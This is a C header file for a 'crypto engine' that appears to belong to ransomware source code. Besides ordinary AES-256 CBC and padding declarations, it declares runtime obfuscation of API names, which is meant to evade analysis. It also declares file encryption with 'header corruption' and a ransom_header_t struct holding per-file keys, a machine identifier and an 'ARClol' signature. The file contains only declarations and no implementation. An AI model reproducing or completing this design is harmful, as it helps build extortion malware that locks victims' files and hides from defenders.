#ifndef CRYPTO_ENGINE_H
#define CRYPTO_ENGINE_H

#include <stdint.h>
#include <stddef.h>

// AES-256 implementation for file encryption
#define AES_BLOCK_SIZE 16
#define AES_KEY_SIZE 32
#define AES_IV_SIZE 16

typedef struct {
    uint32_t round_keys[60];  // 14 rounds for AES-256
    uint8_t key[AES_KEY_SIZE];
    uint8_t iv[AES_IV_SIZE];
} aes_context_t;

// Core AES functions
void aes_init(aes_context_t* ctx, const uint8_t* key, const uint8_t* iv);
void aes_encrypt_block(aes_context_t* ctx, const uint8_t* input, uint8_t* output);
void aes_decrypt_block(aes_context_t* ctx, const uint8_t* input, uint8_t* output);

// CBC mode encryption/decryption
int aes_encrypt_cbc(aes_context_t* ctx, const uint8_t* input, uint8_t* output, size_t length);
int aes_decrypt_cbc(aes_context_t* ctx, const uint8_t* input, uint8_t* output, size_t length);

// PKCS7 padding
size_t pkcs7_pad(uint8_t* data, size_t length, size_t block_size);
size_t pkcs7_unpad(const uint8_t* data, size_t length);

// Random number generation for keys/IVs
void generate_random_bytes(uint8_t* buffer, size_t length);

// API encryption/decryption for runtime obfuscation
typedef struct {
    uint8_t encrypted_name[64];
    uint8_t key[16];
    size_t name_length;
} encrypted_api_t;

void encrypt_api_name(const char* api_name, encrypted_api_t* encrypted);
void decrypt_api_name(const encrypted_api_t* encrypted, char* decrypted);

// File encryption with header corruption
typedef struct {
    uint8_t magic[32];           // ARClol signature
    uint32_t original_size;      // Original file size
    uint32_t header_size;        // Corrupted header size
    uint8_t file_key[AES_KEY_SIZE];  // Per-file encryption key
    uint8_t file_iv[AES_IV_SIZE];    // Per-file IV
    uint64_t timestamp;          // Encryption timestamp
    char machine_id[64];         // Machine identifier
} ransom_header_t;

int encrypt_file_with_header(const char* input_path, const char* output_path, 
                           const uint8_t* master_key, const char* machine_id);

#endif // CRYPTO_ENGINE_H
